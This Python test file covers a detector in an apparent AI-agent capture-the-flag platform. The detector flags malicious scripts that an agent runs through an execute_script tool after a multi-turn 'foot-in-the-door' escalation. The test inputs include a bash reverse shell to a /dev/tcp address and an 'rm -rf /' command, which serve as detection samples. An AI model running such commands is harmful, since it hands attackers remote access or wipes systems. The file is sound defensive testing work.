"""Regression tests for RCEDetector (pre-existing detector).

Fires on malicious script content (reverse shells, destructive commands)
executed via execute_script, gated behind a multi-turn requirement of
prior "safe" SystemUtils tool calls to rule out lucky single-shot completions.
"""

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from finbot.core.data.database import Base
from finbot.core.data.models import CTFEvent
from finbot.ctf.detectors.implementations.rce import RCEDetector


@pytest.fixture
def db():
    engine = create_engine("sqlite:///:memory:", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    Session = sessionmaker(bind=engine)
    session = Session()
    yield session
    session.close()
    Base.metadata.drop_all(bind=engine)


def _prior_call(db, namespace="test", user_id="user-1", tool_name="run_diagnostics", workflow_id="wf-1"):
    evt = CTFEvent(
        external_event_id=f"evt-{tool_name}-{workflow_id}",
        namespace=namespace,
        user_id=user_id,
        workflow_id=workflow_id,
        event_category="agent",
        event_type="agent.systemutils_agent.mcp_tool_call_success",
        tool_name=tool_name,
        summary="prior safe call",
    )
    db.add(evt)
    db.commit()


def _event(script_content, namespace="test", user_id="user-1", workflow_id="wf-1"):
    return {
        "event_type": "agent.systemutils_agent.mcp_tool_call_success",
        "agent_name": "systemutils_agent",
        "tool_name": "execute_script",
        "mcp_server": "systemutils",
        "namespace": namespace,
        "user_id": user_id,
        "workflow_id": workflow_id,
        "tool_arguments": {"script_content": script_content},
    }


@pytest.mark.asyncio
async def test_fires_on_reverse_shell_with_prior_calls(db):
    _prior_call(db)
    detector = RCEDetector("test-challenge", {})
    event = _event("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    result = await detector.check_event(event, db)
    assert result.detected is True
    assert result.confidence == 1.0
    assert "reverse_shell_bash_i" in result.evidence["matched_patterns"]


@pytest.mark.asyncio
async def test_no_fire_without_prior_calls_single_shot(db):
    """Single-shot RCE without foot-in-the-door escalation does not count."""
    detector = RCEDetector("test-challenge", {})
    event = _event("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    result = await detector.check_event(event, db)
    assert result.detected is False


@pytest.mark.asyncio
async def test_no_fire_on_benign_script(db):
    _prior_call(db)
    detector = RCEDetector("test-challenge", {})
    event = _event("echo 'hello world'")
    result = await detector.check_event(event, db)
    assert result.detected is False


@pytest.mark.asyncio
async def test_fires_with_gate_disabled(db):
    """min_prior_tool_calls=0 disables the multi-turn gate."""
    detector = RCEDetector("test-challenge", {"min_prior_tool_calls": 0})
    event = _event("rm -rf /")
    result = await detector.check_event(event, db)
    assert result.detected is True
    assert "destructive_rm_rf" in result.evidence["matched_patterns"]


@pytest.mark.asyncio
async def test_no_fire_on_wrong_tool(db):
    detector = RCEDetector("test-challenge", {})
    event = _event("rm -rf /")
    event["tool_name"] = "read_config"
    result = await detector.check_event(event, db)
    assert result.detected is False


@pytest.mark.asyncio
async def test_no_fire_on_empty_content(db):
    detector = RCEDetector("test-challenge", {})
    event = _event("")
    result = await detector.check_event(event, db)
    assert result.detected is False
